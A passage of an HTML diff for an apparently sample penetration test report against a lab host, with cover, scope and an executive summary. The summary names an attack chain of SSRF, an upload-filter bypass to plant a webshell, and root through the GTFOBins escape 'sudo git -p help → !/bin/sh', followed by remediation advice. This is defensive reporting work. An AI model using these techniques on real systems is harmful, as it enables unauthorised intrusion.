+  border-top: 1px solid var(--border);
+  margin: 1.5rem 0;
+}
+
+/* ─── INLINE TAG ─────────────────────────────────────────────── */
+.tag {
+  display: inline-block;
+  font-size: 0.7rem;
+  font-weight: 600;
+  padding: 0.15rem 0.45rem;
+  border-radius: var(--r-sm);
+  letter-spacing: 0.04em;
+  background: var(--surface-cool);
+  color: var(--ink-light);
+  border: 1px solid var(--border);
+}
+</style>
+</head>
+<body>
+
+<!-- ═══════════════════════════════════════════
+     CONFIDENTIAL BANNER
+═══════════════════════════════════════════ -->
+<div class="confid-banner">
+  <span>CONFIDENTIAL</span> — CLIENT PRIVILEGED &nbsp;·&nbsp; ARG-PT-2026-0619 &nbsp;·&nbsp; SAMPLE / ANONYMIZED &nbsp;·&nbsp; NOT FOR DISTRIBUTION
+</div>
+
+<div class="page-wrapper">
+
+<!-- ═══════════════════════════════════════════
+     COVER PAGE
+═══════════════════════════════════════════ -->
+<section class="cover">
+  <div class="cover-top-rule"></div>
+
+  <header class="cover-header">
+    <div class="cover-logo">ARG<span>US</span></div>
+    <div class="cover-classification">CONFIDENTIAL — CLIENT PRIVILEGED</div>
+  </header>
+
+  <div class="cover-body">
+    <div class="cover-eyebrow">Security Assessment Report &nbsp;·&nbsp; ARG-PT-2026-0619 &nbsp;·&nbsp; June 2026</div>
+
+    <h1 class="cover-title">Penetration Test<br>Report</h1>
+    <p class="cover-subtitle">Target: FORGE (10.129.21.254) &nbsp;·&nbsp; External Network + Web Application</p>
+    <div class="cover-divider"></div>
+
+    <div class="cover-meta-grid">
+      <div class="cover-meta-item">
+        <div class="cover-meta-label">Target Host</div>
+        <div class="cover-meta-value" style="font-family:'JetBrains Mono',monospace;font-size:0.82rem;">10.129.21.254 ("FORGE")</div>
+      </div>
+      <div class="cover-meta-item">
+        <div class="cover-meta-label">Scope</div>
+        <div class="cover-meta-value">Single Host · Web + Infra</div>
+      </div>
+      <div class="cover-meta-item">
+        <div class="cover-meta-label">Engagement Window</div>
+        <div class="cover-meta-value">18–19 Jun 2026</div>
+      </div>
+      <div class="cover-meta-item">
+        <div class="cover-meta-label">Assessment ID</div>
+        <div class="cover-meta-value" style="font-family:'JetBrains Mono',monospace;font-size:0.82rem;">ARG-PT-2026-0619</div>
+      </div>
+      <div class="cover-meta-item">
+        <div class="cover-meta-label">Analysts</div>
+        <div class="cover-meta-value">ARGUS Autonomous Engine<br><span style="font-size:0.75rem;color:var(--ink-faint);">(Operator-Reviewed)</span></div>
+      </div>
+      <div class="cover-meta-item">
+        <div class="cover-meta-label">Report Date</div>
+        <div class="cover-meta-value">19 Jun 2026 · 09:30</div>
+      </div>
+    </div>
+
+    <div class="cover-badges">
+      <div>
+        <div class="cover-meta-label" style="margin-bottom:0.5rem;">Overall Risk</div>
+        <span class="badge badge-critical">&#9632; Critical Risk</span>
+      </div>
+      <div>
+        <div class="cover-meta-label" style="margin-bottom:0.5rem;">Outcome</div>
+        <span class="badge badge-outcome">&#9650; Full Compromise — Root</span>
+      </div>
+      <div>
+        <div class="cover-meta-label" style="margin-bottom:0.5rem;">Assessment Type</div>
+        <span class="badge badge-outline">Grey-Box · Time-Boxed</span>
+      </div>
+      <div class="sample-tag">Sample</div>
+    </div>
+  </div>
+
+  <footer class="cover-footer-bar">
+    <div class="cover-footer-left">
+      <strong>ARGUS Security</strong> &nbsp;·&nbsp; Autonomous Penetration Testing Engine<br>
+      <span style="font-size:var(--fs-micro);color:var(--ink-faint);">Operator-reviewed. Every finding grounded in concrete tool evidence.</span>
+    </div>
+    <div class="cover-footer-right">
+      CONFIDENTIAL — CLIENT PRIVILEGED<br>
+      Not for distribution beyond named recipients.<br>
+      Generated: 2026-06-19 09:30 UTC
+    </div>
+  </footer>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     DOCUMENT CONTROL + TABLE OF CONTENTS
+═══════════════════════════════════════════ -->
+<section class="section section-alt page-break" id="doc-control">
+  <div class="section-numeral">00</div>
+  <div class="section-label">Document Control</div>
+  <h2 class="section-title">Document Control &amp; Contents</h2>
+  <div class="section-rule"></div>
+
+  <div class="two-col" style="gap:3rem;margin-bottom:2rem;">
+    <div>
+      <h3 style="font-family:'Fraunces',serif;font-size:1rem;font-weight:700;color:var(--brand);margin-bottom:1rem;">Document Information</h3>
+      <table style="width:100%;font-size:var(--fs-small);border-collapse:collapse;">
+        <tr style="border-bottom:1px solid var(--border);">
+          <td style="padding:0.5rem 0.5rem 0.5rem 0;color:var(--ink-faint);font-weight:600;font-size:var(--fs-micro);letter-spacing:0.1em;text-transform:uppercase;width:38%;">Document Title</td>
+          <td style="padding:0.5rem;color:var(--ink-mid);">ARGUS Security Assessment Report</td>
+        </tr>
+        <tr style="border-bottom:1px solid var(--border);">
+          <td style="padding:0.5rem 0.5rem 0.5rem 0;color:var(--ink-faint);font-weight:600;font-size:var(--fs-micro);letter-spacing:0.1em;text-transform:uppercase;">Reference ID</td>
+          <td style="padding:0.5rem;color:var(--ink-mid);font-family:'JetBrains Mono',monospace;font-size:0.8rem;">ARG-PT-2026-0619</td>
+        </tr>
+        <tr style="border-bottom:1px solid var(--border);">
+          <td style="padding:0.5rem 0.5rem 0.5rem 0;color:var(--ink-faint);font-weight:600;font-size:var(--fs-micro);letter-spacing:0.1em;text-transform:uppercase;">Classification</td>
+          <td style="padding:0.5rem;"><span style="color:var(--sev-critical);font-weight:700;">CONFIDENTIAL — CLIENT PRIVILEGED</span></td>
+        </tr>
+        <tr style="border-bottom:1px solid var(--border);">
+          <td style="padding:0.5rem 0.5rem 0.5rem 0;color:var(--ink-faint);font-weight:600;font-size:var(--fs-micro);letter-spacing:0.1em;text-transform:uppercase;">Version</td>
+          <td style="padding:0.5rem;color:var(--ink-mid);">1.0 (Final)</td>
+        </tr>
+        <tr style="border-bottom:1px solid var(--border);">
+          <td style="padding:0.5rem 0.5rem 0.5rem 0;color:var(--ink-faint);font-weight:600;font-size:var(--fs-micro);letter-spacing:0.1em;text-transform:uppercase;">Report Date</td>
+          <td style="padding:0.5rem;color:var(--ink-mid);">19 June 2026 · 09:30 UTC</td>
+        </tr>
+        <tr style="border-bottom:1px solid var(--border);">
+          <td style="padding:0.5rem 0.5rem 0.5rem 0;color:var(--ink-faint);font-weight:600;font-size:var(--fs-micro);letter-spacing:0.1em;text-transform:uppercase;">Engagement Window</td>
+          <td style="padding:0.5rem;color:var(--ink-mid);">18–19 June 2026</td>
+        </tr>
+        <tr style="border-bottom:1px solid var(--border);">
+          <td style="padding:0.5rem 0.5rem 0.5rem 0;color:var(--ink-faint);font-weight:600;font-size:var(--fs-micro);letter-spacing:0.1em;text-transform:uppercase;">Analysts</td>
+          <td style="padding:0.5rem;color:var(--ink-mid);">ARGUS Autonomous Engine (Operator-Reviewed)</td>
+        </tr>
+        <tr>
+          <td style="padding:0.5rem 0.5rem 0.5rem 0;color:var(--ink-faint);font-weight:600;font-size:var(--fs-micro);letter-spacing:0.1em;text-transform:uppercase;">Status</td>
+          <td style="padding:0.5rem;color:var(--ink-mid);"><span class="badge badge-outcome" style="font-size:0.68rem;padding:0.2rem 0.6rem;">Final — Retest Complete</span></td>
+        </tr>
+      </table>
+    </div>
+
+    <div>
+      <h3 style="font-family:'Fraunces',serif;font-size:1rem;font-weight:700;color:var(--brand);margin-bottom:1rem;">Handling Instructions</h3>
+      <div class="callout callout-critical" style="margin-top:0;">
+        <div class="callout-title">Restricted Distribution</div>
+        This document contains sensitive vulnerability details and captured credentials. Distribution is restricted to named recipients only. Do not forward, copy, or store on unencrypted media. Destroy or shred all physical copies after use. This report is marked SAMPLE / ANONYMIZED for portfolio demonstration.
+      </div>
+
+      <div style="margin-top:1.2rem;">
+        <div class="cover-meta-label" style="margin-bottom:0.6rem;">Severity Legend</div>
+        <div class="legend">
+          <div class="legend-item"><div class="legend-dot" style="background:var(--sev-critical);"></div>Critical (9.0–10)</div>
+          <div class="legend-item"><div class="legend-dot" style="background:var(--sev-high);"></div>High (7.0–8.9)</div>
+          <div class="legend-item"><div class="legend-dot" style="background:var(--sev-medium);"></div>Medium (4.0–6.9)</div>
+          <div class="legend-item"><div class="legend-dot" style="background:var(--sev-low);"></div>Low (0.1–3.9)</div>
+          <div class="legend-item"><div class="legend-dot" style="background:var(--sev-info);"></div>Info (0)</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <h3 style="font-family:'Fraunces',serif;font-size:1.05rem;font-weight:700;color:var(--brand);margin-bottom:0.5rem;">Table of Contents</h3>
+
+  <div class="two-col" style="gap:2rem;">
+    <ul class="toc-list">
+      <li class="toc-section-head">Front Matter</li>
+      <li class="toc-item"><span class="toc-num">00</span><span class="toc-text">Document Control &amp; Contents</span><span class="toc-dots"></span><span class="toc-page">2</span></li>
+      <li class="toc-item"><span class="toc-num">01</span><span class="toc-text">Executive Summary</span><span class="toc-dots"></span><span class="toc-page">3</span></li>
+      <li class="toc-item"><span class="toc-num">02</span><span class="toc-text">System &amp; Scope</span><span class="toc-dots"></span><span class="toc-page">4</span></li>
+      <li class="toc-item"><span class="toc-num">03</span><span class="toc-text">Methodology &amp; CVSS Rubric</span><span class="toc-dots"></span><span class="toc-page">5</span></li>
+      <li class="toc-section-head" style="margin-top:0.8rem;">Technical Findings</li>
+      <li class="toc-item"><span class="toc-num">04</span><span class="toc-text">Attack Path / Kill-Chain Graph</span><span class="toc-dots"></span><span class="toc-page">6</span></li>
+      <li class="toc-item"><span class="toc-num">05</span><span class="toc-text">Attacks Attempted — Coverage Log</span><span class="toc-dots"></span><span class="toc-page">7</span></li>
+      <li class="toc-item"><span class="toc-num">06</span><span class="toc-text">Findings Register</span><span class="toc-dots"></span><span class="toc-page">8</span></li>
+      <li class="toc-item"><span class="toc-num">07</span><span class="toc-text">Detailed Finding Cards</span><span class="toc-dots"></span><span class="toc-page">9</span></li>
+    </ul>
+    <ul class="toc-list">
+      <li class="toc-section-head">Intelligence &amp; Response</li>
+      <li class="toc-item"><span class="toc-num">08</span><span class="toc-text">Tested — Not Exploitable</span><span class="toc-dots"></span><span class="toc-page">14</span></li>
+      <li class="toc-item"><span class="toc-num">09</span><span class="toc-text">Detection / Purple-Team Mapping</span><span class="toc-dots"></span><span class="toc-page">15</span></li>
+      <li class="toc-item"><span class="toc-num">10</span><span class="toc-text">Evidence Appendix</span><span class="toc-dots"></span><span class="toc-page">16</span></li>
+      <li class="toc-item"><span class="toc-num">11</span><span class="toc-text">MITRE ATT&amp;CK Map</span><span class="toc-dots"></span><span class="toc-page">17</span></li>
+      <li class="toc-section-head" style="margin-top:0.8rem;">Remediation &amp; Closeout</li>
+      <li class="toc-item"><span class="toc-num">12</span><span class="toc-text">Remediation Roadmap</span><span class="toc-dots"></span><span class="toc-page">18</span></li>
+      <li class="toc-item"><span class="toc-num">13</span><span class="toc-text">Engagement Timeline</span><span class="toc-dots"></span><span class="toc-page">19</span></li>
+      <li class="toc-item"><span class="toc-num">14</span><span class="toc-text">Data Visualizations</span><span class="toc-dots"></span><span class="toc-page">20</span></li>
+    </ul>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════════
+     §01 — EXECUTIVE SUMMARY
+═══════════════════════════════════════════ -->
+<section class="section page-break" id="exec-summary">
+  <div class="section-numeral">01</div>
+  <div class="section-label">Executive Summary</div>
+  <h2 class="section-title">Executive Summary</h2>
+  <p class="section-lead">A plain-English account of what ARGUS found, what it achieved, and what must be fixed immediately.</p>
+  <div class="section-rule"></div>
+
+  <!-- Stat Tiles -->
+  <div class="stat-row">
+    <div class="stat-tile stat-tile-critical avoid-break">
+      <div class="stat-num">2</div>
+      <div class="stat-label">Critical</div>
+    </div>
+    <div class="stat-tile stat-tile-high avoid-break">
+      <div class="stat-num">3</div>
+      <div class="stat-label">High</div>
+    </div>
+    <div class="stat-tile stat-tile-medium avoid-break">
+      <div class="stat-num">3</div>
+      <div class="stat-label">Medium</div>
+    </div>
+    <div class="stat-tile stat-tile-low avoid-break">
+      <div class="stat-num">2</div>
+      <div class="stat-label">Low</div>
+    </div>
+    <div class="stat-tile stat-tile-info avoid-break">
+      <div class="stat-num">4</div>
+      <div class="stat-label">Info</div>
+    </div>
+    <div class="stat-tile stat-tile-total avoid-break">
+      <div class="stat-num">14</div>
+      <div class="stat-label">Total Findings</div>
+    </div>
+    <div class="stat-tile stat-tile-access avoid-break">
+      <div class="stat-num">ROOT</div>
+      <div class="stat-label">Max Access</div>
+    </div>
+  </div>
+
+  <!-- Headline callout -->
+  <div class="callout callout-critical avoid-break">
+    <div class="callout-title">&#9888; Full Compromise — Root Access Achieved Autonomously</div>
+    ARGUS chained an unauthenticated Server-Side Request Forgery (SSRF) vulnerability in the public web portal against an internal administration service, bypassed a file-upload content filter to plant a persistent webshell, obtained unauthenticated remote code execution as <code>www-data</code>, and then escalated to full root privilege via a misconfigured <code>sudo NOPASSWD /usr/bin/git</code> entry (GTFOBins technique). Both the user flag (<code>user.txt</code>) and root flag (<code>root.txt</code>) were captured. The entire attack chain was executed autonomously by the ARGUS engine and subsequently confirmed by operator review and retest.
+  </div>
+
+  <div class="two-col" style="margin-top:2rem;gap:2.5rem;">
+    <div>
+      <h3 style="font-family:'Fraunces',serif;font-weight:700;font-size:1.05rem;color:var(--brand);margin-bottom:1rem;">What Happened</h3>
+      <p style="font-size:var(--fs-small);color:var(--ink-mid);line-height:1.7;">The FORGE host presented a public-facing Apache web portal on port 80 that exposed an internal fetch service (<code>/api/fetch</code>) without an egress allow-list. ARGUS identified this SSRF vector and pivoted internally to a Werkzeug-based administration panel running on <code>127.0.0.1:8080</code>, a service that was entirely unreachable from the external network by any other means.</p>
+      <p style="font-size:var(--fs-small);color:var(--ink-mid);line-height:1.7;margin-top:0.6rem;">From the internal admin panel, ARGUS discovered a file-upload endpoint at <code>/upload</code>. The upload filter — checking only file extension — was bypassed using a double-extension (<code>shell.php.jpg</code>) combined with a forged JPEG magic-byte header. The resulting PHP webshell, deposited inside the web root at <code>/uploads/</code>, provided persistent, unauthenticated remote code execution.</p>
+      <p style="font-size:var(--fs-small);color:var(--ink-mid);line-height:1.7;margin-top:0.6rem;">Privilege escalation was immediate: <code>LinPEAS</code> identified a <code>sudo</code> rule granting <code>www-data</code> passwordless execution of <code>/usr/bin/git</code>. Via the well-documented GTFOBins shell-escape (<code>sudo git -p help → !/bin/sh</code>), ARGUS obtained a root shell within minutes of the initial foothold.</p>
+
+      <h3 style="font-family:'Fraunces',serif;font-weight:700;font-size:1.05rem;color:var(--brand);margin-top:1.5rem;margin-bottom:0.8rem;">Root Cause</h3>
+      <p style="font-size:var(--fs-small);color:var(--ink-mid);line-height:1.7;">The single architectural root cause is <strong>untrusted web input reaching an internal fetch service with no egress allow-list</strong>. All subsequent compromise — upload bypass, webshell, and privilege escalation — were only possible because the SSRF provided an authenticated foothold inside the trust boundary. Remediation of the SSRF alone would have contained the blast radius to zero exploitation.</p>
+    </div>
+
+    <div>
+      <h3 style="font-family:'Fraunces',serif;font-weight:700;font-size:1.05rem;color:var(--brand);margin-bottom:1rem;">Priority Actions</h3>
+      <ul class="action-list">
+        <li class="action-item">
+          <div class="action-num">1</div>
+          <div><strong style="color:var(--sev-critical);">Immediately restrict the fetch service.</strong> Implement a strict egress allow-list on <code>/api/fetch</code> so it may only reach approved external hosts. Block all requests to RFC-1918 ranges and loopback addresses.</div>
+        </li>
+        <li class="action-item">
+          <div class="action-num">2</div>
+          <div><strong style="color:var(--sev-critical);">Enforce upload content validation.</strong> Validate MIME type via magic-byte inspection and file-extension; store uploaded files outside the web root on a <code>noexec</code> partition. Remove existing <code>/uploads/</code> contents.</div>
+        </li>
+        <li class="action-item">
+          <div class="action-num">3</div>
+          <div><strong style="color:var(--sev-high);">Remove the sudo NOPASSWD git rule.</strong> Revoke the <code>www-data ALL=(ALL) NOPASSWD: /usr/bin/git</code> sudoers entry immediately. Audit all remaining NOPASSWD entries.</div>
+        </li>
+        <li class="action-item">
+          <div class="action-num">4</div>
+          <div><strong style="color:var(--sev-high);">Rotate all captured credentials.</strong> The leaked <code>id_rsa</code> private key and <code>config.php</code> database credentials must be considered fully compromised. Rotate all secrets, revoke and re-issue the SSH key pair.</div>
+        </li>
+        <li class="action-item">
+          <div class="action-num">5</div>
+          <div><strong style="color:var(--sev-medium);">Apply P2/P3 hardening in parallel.</strong> Patch Apache 2.4.41, add CSP/HSTS headers, disable TRACE, encode <code>/search</code> output, disable TLS 1.0/1.1, and suppress verbose server banners.</div>
+        </li>
+      </ul>
+
+      <div class="callout callout-gold" style="margin-top:1.2rem;">
+        <div class="callout-title">Assessment Note</div>
+        All attack paths were validated end-to-end by the ARGUS Issue-Validator gate. Every finding is grounded in concrete tool evidence with integrity-hashed artifacts. Zero false positives were shipped.
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     §02 — SYSTEM & SCOPE
+═══════════════════════════════════════════ -->
+<section class="section section-alt" id="scope">
+  <div class="section-numeral">02</div>
+  <div class="section-label">System &amp; Scope</div>
+  <h2 class="section-title">System &amp; Scope</h2>
+  <p class="section-lead">Target profile, in-scope services, trust-boundary analysis, and engagement parameters.</p>
+  <div class="section-rule"></div>
+
+  <div class="two-col-60-40 two-col" style="gap:2.5rem;align-items:start;">
+    <div>
+      <div class="avoid-break" style="background:var(--surface);border:1px solid var(--border);border-radius:var(--r-lg);padding:1.4rem 1.6rem;margin-bottom:1.5rem;">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:1rem;">
+          <div>
+            <div class="cover-meta-label">Target Host</div>
+            <div style="font-family:'Fraunces',serif;font-size:1.4rem;font-weight:900;color:var(--brand);letter-spacing:-0.02em;">FORGE</div>
+            <div style="font-family:'JetBrains Mono',monospace;font-size:0.85rem;color:var(--ink-light);">10.129.21.254</div>
+          </div>
+          <div style="text-align:right;">
+            <div class="cover-meta-label">Operating System</div>
+            <div style="font-size:var(--fs-small);font-weight:600;color:var(--ink-mid);">Ubuntu 20.04.4 LTS</div>
+            <div style="font-size:var(--fs-micro);color:var(--ink-faint);">Linux kernel (64-bit)</div>
+          </div>
+        </div>
+
+        <div class="cover-meta-label" style="margin-bottom:0.6rem;">Discovered Services</div>
+        <div style="border:1px solid var(--border);border-radius:var(--r-md);overflow:hidden;">
+          <div class="service-row" style="padding:0.65rem 1rem;background:var(--surface-cool);">
+            <div class="service-port">22/tcp</div>
+            <div class="service-name">OpenSSH 8.2p1</div>
+            <div class="service-desc">Ubuntu 20.04 · Key-auth enforced, rate-limited</div>
+          </div>
+          <div class="service-row" style="padding:0.65rem 1rem;">
+            <div class="service-port">80/tcp</div>
+            <div class="service-name">Apache httpd 2.4.41</div>
+            <div class="service-desc" style="color:var(--sev-critical);font-weight:600;">Public web portal · PRIMARY ATTACK SURFACE</div>
+          </div>
+          <div class="service-row" style="padding:0.65rem 1rem;background:var(--surface-cool);">
+            <div class="service-port" style="color:var(--sev-medium);">8080/tcp</div>
+            <div class="service-name">Werkzeug/2.0 Python 3.8</div>
+            <div class="service-desc" style="color:var(--sev-medium);font-weight:600;">Internal-only admin · Reachable only via SSRF</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="avoid-break" style="background:var(--surface);border:1px solid var(--border);border-radius:var(--r-lg);padding:1.4rem 1.6rem;">
+        <div class="cover-meta-label" style="margin-bottom:0.6rem;">Trust Boundary Analysis</div>
+        <!-- SVG Trust Boundary Diagram -->
+        <svg viewBox="0 0 520 180" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:520px;display:block;border-radius:8px;">
+          <defs>
+            <marker id="arr" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+              <path d="M0,0 L0,6 L8,3 z" fill="#C0392B"/>
+            </marker>
+            <marker id="arr-grey" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+              <path d="M0,0 L0,6 L8,3 z" fill="#9090AA"/>
+            </marker>
+          </defs>
+          <!-- Background zones -->
+          <rect x="0" y="0" width="520" height="180" fill="#1C1C2E" rx="8"/>
+          <!-- External zone -->
+          <rect x="10" y="10" width="140" height="160" fill="none" stroke="#C0392B" stroke-width="1" stroke-dasharray="5,3" rx="6" opacity="0.6"/>
+          <text x="80" y="26" fill="#C0392B" font-size="9" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="1">EXTERNAL</text>
+          <!-- Internal zone -->
+          <rect x="200" y="10" width="140" height="160" fill="none" stroke="#B8960C" stroke-width="1" stroke-dasharray="5,3" rx="6" opacity="0.6"/>
+          <text x="270" y="26" fill="#B8960C" font-size="9" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="1">INTERNAL TRUST</text>
+          <!-- Root zone -->
+          <rect x="370" y="10" width="140" height="160" fill="none" stroke="#27ae60" stroke-width="1" stroke-dasharray="5,3" rx="6" opacity="0.5"/>
+          <text x="440" y="26" fill="#27ae60" font-size="9" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="1">ROOT / OS</text>
+
+          <!-- Attacker box -->
+          <rect x="20" y="50" width="110" height="42" fill="#2C2C4A" stroke="#C0392B" stroke-width="1.5" rx="5"/>
+          <text x="75" y="68" fill="#fff" font-size="9.5" font-family="Inter,sans-serif" font-weight="600" text-anchor="middle">ARGUS</text>
+          <text x="75" y="83" fill="#9090AA" font-size="8" font-family="Inter,sans-serif" text-anchor="middle">External Attacker</text>
+
+          <!-- Apache :80 box -->
+          <rect x="210" y="35" width="120" height="42" fill="#2C2C4A" stroke="#C0392B" stroke-width="1.5" rx="5"/>
+          <text x="270" y="53" fill="#fff" font-size="9.5" font-family="Inter,sans-serif" font-weight="600" text-anchor="middle">Apache :80</text>
+          <text x="270" y="68" fill="#C0392B" font-size="8" font-family="Inter,sans-serif" text-anchor="middle">PUBLIC · /api/fetch</text>
+
+          <!-- Werkzeug :8080 box -->
+          <rect x="210" y="100" width="120" height="42" fill="#2C2C4A" stroke="#B8960C" stroke-width="1.5" rx="5"/>
+          <text x="270" y="118" fill="#fff" font-size="9.5" font-family="Inter,sans-serif" font-weight="600" text-anchor="middle">Werkzeug :8080</text>
+          <text x="270" y="133" fill="#B8960C" font-size="8" font-family="Inter,sans-serif" text-anchor="middle">INTERNAL ADMIN</text>
+
+          <!-- Root shell box -->
+          <rect x="382" y="68" width="115" height="42" fill="#1A6B3C" stroke="#27ae60" stroke-width="1.5" rx="5"/>
+          <text x="440" y="86" fill="#fff" font-size="9.5" font-family="Inter,sans-serif" font-weight="600" text-anchor="middle">Root Shell</text>
+          <text x="440" y="101" fill="#a0ffb8" font-size="8" font-family="Inter,sans-serif" text-anchor="middle">uid=0 / PWNED</text>
+
+          <!-- Arrows -->
+          <!-- Attacker → Apache -->
+          <line x1="130" y1="71" x2="209" y2="56" stroke="#C0392B" stroke-width="1.5" marker-end="url(#arr)"/>
+          <text x="168" y="57" fill="#e74c3c" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">SSRF</text>
+          <!-- Apache → Werkzeug (SSRF pivot) -->
+          <line x1="270" y1="77" x2="270" y2="99" stroke="#C0392B" stroke-width="1.5" marker-end="url(#arr)"/>
+          <text x="285" y="92" fill="#e74c3c" font-size="7.5" font-family="Inter,sans-serif">pivot</text>
+          <!-- Werkzeug → Root (upload+privesc) -->
+          <path d="M330 121 Q380 121 381 89" stroke="#B8960C" stroke-width="1.5" fill="none" marker-end="url(#arr)"/>
+          <text x="365" y="112" fill="#f39c12" font-size="7.5" font-family="Inter,sans-serif">upload→RCE→privesc</text>
+
+          <!-- No-list label -->
+          <text x="168" y="170" fill="#9090AA" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle" font-style="italic">no egress allow-list</text>
+        </svg>
+
+        <p style="font-size:var(--fs-micro);color:var(--ink-faint);margin-top:0.6rem;">Root cause: the fetch service bridges the external and internal trust zones with no allow-list, enabling full lateral movement via a crafted URL.</p>
+      </div>
+    </div>
+
+    <div>
+      <div class="avoid-break" style="background:var(--surface);border:1px solid var(--border);border-radius:var(--r-lg);padding:1.4rem 1.6rem;margin-bottom:1.2rem;">
+        <div class="cover-meta-label" style="margin-bottom:0.8rem;">Engagement Parameters</div>
+        <table style="width:100%;font-size:var(--fs-small);border-collapse:collapse;">
+          <tr style="border-bottom:1px solid var(--border);"><td style="padding:0.5rem 0;color:var(--ink-faint);font-size:var(--fs-micro);font-weight:700;text-transform:uppercase;letter-spacing:0.1em;">Type</td><td style="padding:0.5rem;color:var(--ink-mid);">Grey-Box · Time-Boxed</td></tr>
+          <tr style="border-bottom:1px solid var(--border);"><td style="padding:0.5rem 0;color:var(--ink-faint);font-size:var(--fs-micro);font-weight:700;text-transform:uppercase;letter-spacing:0.1em;">Scope</td><td style="padding:0.5rem;color:var(--ink-mid);">Single host · Web + Infrastructure</td></tr>
+          <tr style="border-bottom:1px solid var(--border);"><td style="padding:0.5rem 0;color:var(--ink-faint);font-size:var(--fs-micro);font-weight:700;text-transform:uppercase;letter-spacing:0.1em;">Vector</td><td style="padding:0.5rem;color:var(--ink-mid);">External network · No VPN</td></tr>
+          <tr style="border-bottom:1px solid var(--border);"><td style="padding:0.5rem 0;color:var(--ink-faint);font-size:var(--fs-micro);font-weight:700;text-transform:uppercase;letter-spacing:0.1em;">Credentials</td><td style="padding:0.5rem;color:var(--ink-mid);">None provided (unauthenticated)</td></tr>
+          <tr style="border-bottom:1px solid var(--border);"><td style="padding:0.5rem 0;color:var(--ink-faint);font-size:var(--fs-micro);font-weight:700;text-transform:uppercase;letter-spacing:0.1em;">DoS Testing</td><td style="padding:0.5rem;color:var(--ink-mid);">Excluded from scope</td></tr>
+          <tr><td style="padding:0.5rem 0;color:var(--ink-faint);font-size:var(--fs-micro);font-weight:700;text-transform:uppercase;letter-spacing:0.1em;">Out of Scope</td><td style="padding:0.5rem;color:var(--ink-mid);">All hosts except 10.129.21.254</td></tr>
+        </table>
+      </div>
+
+      <div class="avoid-break" style="background:var(--surface);border:1px solid var(--border);border-radius:var(--r-lg);padding:1.4rem 1.6rem;">
+        <div class="cover-meta-label" style="margin-bottom:0.8rem;">Web Application Paths Discovered</div>
+        <div style="font-size:var(--fs-small);color:var(--ink-mid);display:flex;flex-direction:column;gap:0.4rem;">
+          <div style="display:flex;align-items:center;gap:0.6rem;"><span style="font-family:'JetBrains Mono',monospace;font-size:0.78rem;color:var(--ink);">/admin</span><span class="outcome outcome-blocked">403 Forbidden</span></div>
+          <div style="display:flex;align-items:center;gap:0.6rem;"><span style="font-family:'JetBrains Mono',monospace;font-size:0.78rem;color:var(--ink);">/upload</span><span class="outcome outcome-exploit">Upload endpoint · EXPLOITED</span></div>
+          <div style="display:flex;align-items:center;gap:0.6rem;"><span style="font-family:'JetBrains Mono',monospace;font-size:0.78rem;color:var(--ink);">/api</span><span class="outcome outcome-exploit">SSRF via /api/fetch · EXPLOITED</span></div>
+          <div style="display:flex;align-items:center;gap:0.6rem;"><span style="font-family:'JetBrains Mono',monospace;font-size:0.78rem;color:var(--ink);">/search</span><span class="outcome outcome-medium">Reflected XSS · MEDIUM</span></div>
+          <div style="display:flex;align-items:center;gap:0.6rem;"><span style="font-family:'JetBrains Mono',monospace;font-size:0.78rem;color:var(--ink);">/login</span><span class="outcome outcome-failed">Cred spray failed · NE</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════════
+     §03 — METHODOLOGY & CVSS RUBRIC
+═══════════════════════════════════════════ -->
+<section class="section" id="methodology">
+  <div class="section-numeral">03</div>
+  <div class="section-label">Methodology</div>
+  <h2 class="section-title">Methodology &amp; CVSS Rubric</h2>
+  <p class="section-lead">How ARGUS plans, executes, and validates. Every action is MITRE-annotated and evidence-chained before a finding ships.</p>
+  <div class="section-rule"></div>
+
+  <div class="two-col" style="gap:2.5rem;align-items:start;">
+    <div>
+      <h3 style="font-family:'Fraunces',serif;font-size:1rem;font-weight:700;color:var(--brand);margin-bottom:0.9rem;">Engagement Process</h3>
+
+      <div style="display:flex;flex-direction:column;gap:0;border:1px solid var(--border);border-radius:var(--r-lg);overflow:hidden;">
+        <div style="display:flex;gap:1rem;align-items:flex-start;padding:1rem 1.2rem;border-bottom:1px solid var(--border);background:var(--surface);">
+          <div style="flex-shrink:0;width:28px;height:28px;border-radius:50%;background:var(--brand);color:#fff;font-size:0.72rem;font-weight:700;display:flex;align-items:center;justify-content:center;">P</div>
+          <div>
+            <div style="font-weight:700;font-size:var(--fs-small);color:var(--ink-mid);margin-bottom:0.2rem;">Plan — Hypothesis Tree</div>
+            <div style="font-size:var(--fs-micro);color:var(--ink-light);line-height:1.55;">ARGUS constructs a structured hypothesis tree of all plausible attack vectors given scope and reconnaissance data. Each hypothesis is prioritised by CVSS pre-exploitation likelihood and banked for ordered execution.</div>
+          </div>
+        </div>
+        <div style="display:flex;gap:1rem;align-items:flex-start;padding:1rem 1.2rem;border-bottom:1px solid var(--border);background:var(--surface-warm);">
+          <div style="flex-shrink:0;width:28px;height:28px;border-radius:50%;background:var(--brand-accent);color:#fff;font-size:0.72rem;font-weight:700;display:flex;align-items:center;justify-content:center;">E</div>
+          <div>
+            <div style="font-weight:700;font-size:var(--fs-small);color:var(--ink-mid);margin-bottom:0.2rem;">Execute — Tool-Driven Exploration</div>
+            <div style="font-size:var(--fs-micro);color:var(--ink-light);line-height:1.55;">Each hypothesis is tested via purpose-built tool calls (nmap, gobuster, sqlmap, custom exploit chains, LinPEAS, GTFOBins). All tool invocations are logged with timestamps, raw output, and evidence hashes.</div>
+          </div>
+        </div>
+        <div style="display:flex;gap:1rem;align-items:flex-start;padding:1rem 1.2rem;border-bottom:1px solid var(--border);background:var(--surface);">
